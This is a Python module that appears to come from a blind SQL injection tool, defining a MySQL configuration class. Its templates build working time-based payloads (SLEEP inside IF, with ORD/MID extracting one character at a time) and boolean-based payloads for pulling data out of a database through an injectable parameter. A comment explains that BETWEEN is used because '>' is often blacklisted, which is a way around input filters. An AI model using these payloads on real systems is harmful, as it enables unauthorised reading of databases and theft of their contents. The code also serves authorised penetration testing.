#!/bin/python

from string import Template
from .abstractConfig import AbstractConfig

class MySqlConfig(AbstractConfig):
    """Contains Mysql specificities"""
    end_char: int = 0
    start_index: int = 1

    def get_equal_compare(self, check_value: int) -> str:
        return f"={check_value}"

    def get_diff_compare(self, check_value: int) -> str:
        return f"!={check_value}"

    def get_supp_compare(self, check_value: int, min: int, max: int) -> str:
        """Between because '>' is often blacklisted"""
        return f" BETWEEN {check_value + 1} AND {max}"

    payload_int_time: Template = Template('(SELECT 1 FROM (SELECT(SLEEP(IF(($request)$test,$sleep_duration,0))))a)')
    payload_str_time: Template = Template('(SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($request),$index,1))$test,$sleep_duration,0))))a)')
    payload_int_bool: Template = Template('($request)$test')
    payload_str_bool: Template = Template('ORD(MID(($request),$index,1))$test')    